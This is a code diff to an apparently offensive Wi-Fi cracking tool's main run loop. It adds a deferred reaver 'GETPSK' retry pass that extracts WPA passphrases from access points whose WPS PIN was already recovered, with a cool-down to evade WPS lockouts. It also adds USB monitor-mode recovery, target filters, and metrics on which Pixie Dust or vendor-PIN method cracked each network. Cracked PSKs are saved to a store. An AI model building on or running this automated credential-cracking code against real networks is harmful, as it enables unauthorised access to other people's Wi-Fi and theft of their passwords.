@@ -14,6 +14,7 @@ import config
 from attack import interface as iface_mod
 from attack import scanner as sc
 from attack import tools, wpa, wps
+from attack import wps_log
 from attack.model import AttackRequest, AttackResult, AttackEvent, EventType
 from cracked_store import load_cracked, save_cracked
 
@@ -61,6 +62,8 @@ _PRESET_MAP = {
     "ignore_locks": ("attack_modes", "Ignore Locks"),
     "band":        ("filters", "Band"),
     "max_targets": ("filters", "Max Targets"),
+    "min_signal":  ("filters", "Min Signal"),
+    "ignore_cracked": ("filters", "Ignore Cracked"),
 }
 
 
@@ -269,6 +272,104 @@ def _record_capture(essid, bssid, cap=None, psk=None, typ="WPA", pin=None,
     save_cracked(entries)
 
 
+def _ensure_mon(iface, iface_name, mon, status_cb):
+    """If the USB card vanished, recover + re-enter monitor. Returns
+    (iface, iface_name, mon) or (None, None, None) if dead."""
+    if any(n == iface_name or n.startswith(iface_name)
+           for n, _ in iface_mod.get_interfaces()):
+        return iface, iface_name, mon
+    if status_cb:
+        status_cb({"type": "message", "text": "usb recover..."})
+    recovered = iface_mod.recover_external_usb(wait=8.0)
+    if not recovered:
+        if status_cb:
+            status_cb({"type": "message", "text": "usb dead-replug"})
+        return None, None, None
+    iface = recovered
+    iface_name = iface_mod.iface_name(iface)
+    mon = iface_mod.enable_monitor(iface_name) or iface_name
+    config.Runtime.monitor_iface = mon
+    _nm_set_managed(iface_name, False)
+    return iface, iface_name, mon
+
+
+def _retry_pending_getpsk(pending, mon, iface, iface_name, req, emit,
+                          status_cb, stop_flag, results):
+    """After the target list: one more GETPSK pass for PIN-without-PSK APs.
+
+    Pixie often locks/rate-limits WPS; waiting until the list finishes gives
+    the AP time to cool before reaver -p tries again.
+    """
+    if not pending:
+        return 0
+    if results.get("cancelled") or (stop_flag and stop_flag.is_set()):
+        return 0
+    cool = 45
+    pending = sorted(
+        pending,
+        key=lambda it: (it.get("target") or {}).get("signal") or -999,
+        reverse=True)
+    if status_cb:
+        status_cb({"type": "message",
+                   "text": "GETPSK retry %d..." % len(pending)})
+    tools.log("getpsk-retry pass n=%d cool=%ss" % (len(pending), cool))
+    time.sleep(cool)
+
+    tool = config.opt_state(req.attack_modes, "WPS Tool", "reaver")
+    run_id = results.get("run_id")
+    got = 0
+    total = len(pending)
+    for i, item in enumerate(pending, 1):
+        if stop_flag and stop_flag.is_set():
+            results["cancelled"] = True
+            break
+        iface, iface_name, mon = _ensure_mon(iface, iface_name, mon, status_cb)
+        if not mon:
+            results["failed"].append(item.get("essid") or "?")
+            break
+
+        t = item["target"]
+        pin = item["pin"]
+        essid = item["essid"]
+        bssid = item["bssid"]
+        emit(AttackEvent(EventType.TARGET, essid=essid, bssid=bssid,
+                         current=i, total=total))
+        emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
+                         phase="GETPSK", countdown=wps.GETPSK_TIMEOUT,
+                         cd_max=wps.GETPSK_TIMEOUT, signal=t.get("signal")))
+        t0 = time.time()
+        psk = wps.recover_psk_on(mon, t, pin, emit, stop_flag, tool=tool)
+        elapsed = time.time() - t0
+        wps_log.method({
+            "run_id": run_id, "bssid": bssid, "essid": essid,
+            "ch": t.get("channel"), "sig": t.get("signal"),
+            "method": "getpsk_retry", "result": "psk" if psk else "fail",
+            "reason": "ok" if psk else "no psk", "pin": pin, "t": elapsed,
+            "won": 1 if psk else 0, "upgraded": 1 if psk else 0,
+        })
+        if psk:
+            got += 1
+            results["psk_retry"] = results.get("psk_retry", 0) + 1
+            emit(AttackEvent(EventType.CRACKED, essid=essid, bssid=bssid,
+                             credential=psk, pin=pin))
+            _record_capture(essid, bssid, psk=psk, pin=pin, typ="WPS",
+                            channel=t.get("channel"))
+            want = config._norm_bssid(bssid)
+            for c in results["cracked"]:
+                if config._norm_bssid(c.get("bssid")) == want:
+                    c["psk"] = psk
+                    break
+            else:
+                results["cracked"].append(
+                    {"essid": essid, "psk": psk, "bssid": bssid, "pin": pin})
+            tools.log("getpsk-retry ok %s %s" % (bssid, essid))
+        else:
+            tools.log("getpsk-retry miss %s %s" % (bssid, essid))
+        time.sleep(1.0)
+    tools.log("getpsk-retry done ok=%d/%d" % (got, total))
+    return got
+
+
 # ---------------------------------------------------------------------------
 # Main entry
 # ---------------------------------------------------------------------------
@@ -294,7 +395,15 @@ def run(iface, preset=None, progress_cb=None, status_cb=None, stop_flag=None):
         else:
             status_cb(ev.as_dict())
 
-    results = {"cracked": [], "handshakes": [], "failed": [], "cancelled": False}
+    run_id = wps_log.new_run_id()
+    results = {"cracked": [], "handshakes": [], "failed": [], "cancelled": False,
+               "run_id": run_id,
+               "psk_inline": 0, "pin_only": 0,
+               "win_reaver": 0, "win_oneshot": 0, "win_vendor": 0,
+               "psk_getpsk": 0, "psk_retry": 0}
+    getpsk_ok = 0
+    tools.log("run-start run_id=%s preset=%s" % (
+        run_id, (preset or {}).get("name") if preset else "config"))
     _nm_set_managed(iface_name, False)
 
     try:
@@ -319,6 +428,8 @@ def run(iface, preset=None, progress_cb=None, status_cb=None, stop_flag=None):
         config.Runtime.monitor_iface = mon
 
         total = len(targets)
+        # PIN found but GETPSK missed — retry after the full list (AP cool-down).
+        pending_getpsk = []
         for i, t in enumerate(targets, 1):
             if stop_flag and stop_flag.is_set():
                 results["cancelled"] = True
@@ -345,20 +456,40 @@ def run(iface, preset=None, progress_cb=None, status_cb=None, stop_flag=None):
                              bssid=t.get("bssid"), current=i, total=total))
 
             if "wps" in req.attacks:
-                r = wps.pixie(mon, t, req, emit, stop_flag)
+                r = wps.pixie(mon, t, req, emit, stop_flag,
+                             run_id=run_id, iface_name=iface_name)
+                if r.get("mon"):
+                    mon = r["mon"]
+                    config.Runtime.monitor_iface = mon
                 if r.get("cancelled"):
                     results["cancelled"] = True
                     break
                 if r.get("ok"):
                     cred = r.get("psk") or r.get("pin")
-                    results["cracked"].append({"essid": r["essid"], "psk": cred})
+                    results["cracked"].append({"essid": r["essid"], "psk": cred,
+                                              "bssid": r.get("bssid"),
+                                              "pin": r.get("pin")})
                     _record_capture(r["essid"], r["bssid"], psk=r.get("psk"),
                                     pin=r.get("pin"), typ="WPS",
                                     channel=t.get("channel"))
+                    w = r.get("winner")
+                    if w == "reaver_pixie":
+                        results["win_reaver"] += 1
+                    elif w == "oneshot_pixie":
+                        results["win_oneshot"] += 1
+                    elif w == "vendor_pin":
+                        results["win_vendor"] += 1
+                    if r.get("psk_from") == "getpsk":
+                        results["psk_getpsk"] += 1
                     if r.get("psk"):
-                        continue  # got the actual PSK — done with this target
-                    # PIN-only (no PSK): keep the PIN but still try to capture a
-                    # usable handshake below, since a PIN isn't the password.
+                        results["psk_inline"] += 1
+                        continue
+                    if r.get("pin"):
+                        results["pin_only"] += 1
+                        pending_getpsk.append({
+                            "target": t, "pin": r["pin"],
+                            "essid": r["essid"], "bssid": r["bssid"]})
+                    # PIN-only: still try handshake below if WPA is enabled.
 
             if "pmkid" in req.attacks and pmkid_mod:
                 r = pmkid_mod.capture(mon, t, req, emit, stop_flag)
@@ -381,6 +512,10 @@ def run(iface, preset=None, progress_cb=None, status_cb=None, stop_flag=None):
                                     channel=t.get("channel") or r.get("channel"))
                 else:
                     results["failed"].append(r.get("essid"))
+
+        getpsk_ok = _retry_pending_getpsk(
+            pending_getpsk, mon, iface, iface_name, req, emit, status_cb,
+            stop_flag, results)
     finally:
         iface_mod.disable_monitor(config.Runtime.monitor_iface or iface_name)
         _nm_set_managed(iface_name, True)
@@ -400,13 +535,24 @@ def run(iface, preset=None, progress_cb=None, status_cb=None, stop_flag=None):
             pass
 
     from attack import tools as _tools
+    pin_only_left = sum(
+        1 for c in results["cracked"]
+        if c.get("pin") and not c.get("psk"))
     _tools.log(
-        "run-metric cracked=%d hs=%d failed=%d cancelled=%s elapsed=%.1f "
-        "preset=%s"
-        % (len(results["cracked"]), len(results["handshakes"]),
-           len(results["failed"]), results["cancelled"],
-           time.time() - start,
-           (preset or {}).get("name") if preset else "config"))
+        "run-metric run_id=%s cracked=%d pin_only=%d hs=%d failed=%d "
+        "cancelled=%s elapsed=%.1f preset=%s getpsk_retry=%d "
+        "psk_inline=%d pin_queued=%d "
+        "win_reaver=%d win_oneshot=%d win_vendor=%d "
+        "psk_getpsk=%d psk_retry=%d"
+        % (results.get("run_id"), len(results["cracked"]), pin_only_left,
+           len(results["handshakes"]), len(results["failed"]),
+           results["cancelled"], time.time() - start,
+           (preset or {}).get("name") if preset else "config",
+           getpsk_ok, results.get("psk_inline", 0),
+           results.get("pin_only", 0),
+           results.get("win_reaver", 0), results.get("win_oneshot", 0),
+           results.get("win_vendor", 0), results.get("psk_getpsk", 0),
+           results.get("psk_retry", 0)))
 
     return AttackResult(
         ok=not results["cancelled"],
